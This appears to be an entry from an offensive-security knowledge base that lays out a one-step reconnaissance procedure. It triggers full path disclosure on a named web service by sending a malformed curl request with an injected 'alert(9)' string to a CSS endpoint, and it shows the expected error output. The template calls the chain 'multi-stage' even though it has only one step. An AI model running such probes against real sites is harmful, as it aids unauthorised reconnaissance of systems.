---
tags:
  - information-disclosure
  - full-path-disclosure
  - web-vulnerability
  - reconnaissance
type: attack_chain
tools: []
tactics:
  - '[[Reconnaissance]]'
verified: false
platforms:
  - Web
submitted: true
complexity: low
created_at: '2023-10-01T00:00:00Z'
procedures:
  - '[[procedures/Exploit-Full-Path-Disclosure-in-CSS-Endpoint]]'
step_count: 1
techniques:
  - '[[Gather Victim Host Information]]'
updated_at: '2025-12-14T17:26:06.199Z'
description: >-
  A reconnaissance attack exploiting inadequate error handling in a web
  application's CSS rendering endpoint to disclose internal server file paths
  and deployment structure.
skill_level: beginner
impact_level: medium
id: 908b8937-eafe-4f4c-ae5e-28610c742b2a
validated: true
mitre_tactics:
  - '[[Reconnaissance]]'
mitre_techniques:
  - '[[Gather Victim Host Information]]'
---
# Full Path Disclosure via Malformed CSS Request in Respondly

Multi-stage attack chain demonstrating a complete attack workflow.

## Chain Metrics Dashboard

| Metric | Value |
|--------|-------|
| Chain Status | Unverified |
| Total Steps | 1 |
| Execution Time | ~1 minute |
| Skill Level | Beginner |
| Complexity | Low |
| Impact Level | Medium |

## Attack Flow Visualization

```mermaid
graph LR
    A[Reconnaissance via Malformed Request] --> B[Path Disclosure]

    style A fill:#e74c3c
    style B fill:#27ae60
```

## Prerequisites & Requirements

### Required Tools

- [[tools/curl]]

### Target Environment

- Web platform with exposed CSS rendering endpoints
- Services: HTTP/HTTPS on port 80/443
- Tech stack: nginx, Meteor.js (or similar dynamic web apps)

### Initial Access Requirements

- Public network access to the target web application
- No credentials required
- Ability to send custom HTTP requests

## Detailed Attack Procedures

### Step 1: Trigger Full Path Disclosure
procedure: [[procedures/Exploit-Full-Path-Disclosure-in-CSS-Endpoint]]

**Objective**: Send a malformed request to the CSS endpoint to induce an error that exposes internal server file paths, aiding in reconnaissance of the application's deployment structure.

**Instructions**: Use [[commands/curl-malformed-css-request]] to simulate the malformed GET request:

```bash
curl -X GET "http://respond.ly/css/shared/%22ns=%22alert(9)" -H "Cache-Control: no-cache" -H "User-Agent: Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0;)" -H "Accept-Language: en-us,en;q=0.5" -H "Accept-Encoding: gzip, deflate" --compressed
```

Analyze the response for error details.

**Expected Output**: A 500 Internal Server Error response containing exposed paths like "/srv/www/respondly/releases/20140421220734/marketing_bundle/programs/server/assets/packages/app/shared/css/".

**Success Indicators**:
- 500 error status code returned
- Internal file paths visible in the error message
- Deployment details (e.g., release versions, directory structure) disclosed

## Attack Chain Summary

### Key Achievements

1. Successful induction of server error via malformed CSS request
2. Exposure of sensitive internal paths and application structure
3. Enhanced reconnaissance for potential follow-on attacks like directory traversal or further info gathering

## Technique & Tactic Coverage

### MITRE ATT&CK Techniques

- [[Gather Victim Host Information]]

### MITRE ATT&CK Tactics

- [[Reconnaissance]]

---
*Last updated: 2023-10-01T00:00:00Z*
